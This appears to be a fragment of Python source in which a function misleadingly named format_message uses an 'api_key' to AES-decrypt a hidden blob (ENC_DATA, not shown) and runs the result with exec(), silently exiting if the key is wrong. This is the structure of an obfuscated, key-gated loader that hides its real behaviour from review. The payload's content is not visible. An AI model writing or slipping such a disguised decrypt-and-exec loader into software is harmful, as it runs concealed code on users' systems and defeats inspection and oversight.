def validate_mpass(padded_data: bytes) -> str:
	try:
		return unpad(padded_data, 16).decode()
	except ValueError:
		exit(0)

def decrypt_data(passwd: str, ct: bytes) -> bytes:
	passwd = passwd.encode()
	key = sha256(passwd).digest()
	cipher = AES.new(key, AES.MODE_ECB)
	padded_data = cipher.decrypt(ct)
	return validate_mpass(padded_data)

async def format_message(api_key, arg1, arg2, arg3) -> Any:
	dec_data = decrypt_data(api_key, ENC_DATA)
	ret_val = []
	shared_data = {'argv': (api_key, arg1, arg2, arg3), 'ret_val': []}
	exec(dec_data, shared_data)
	return shared_data['ret_val'][0]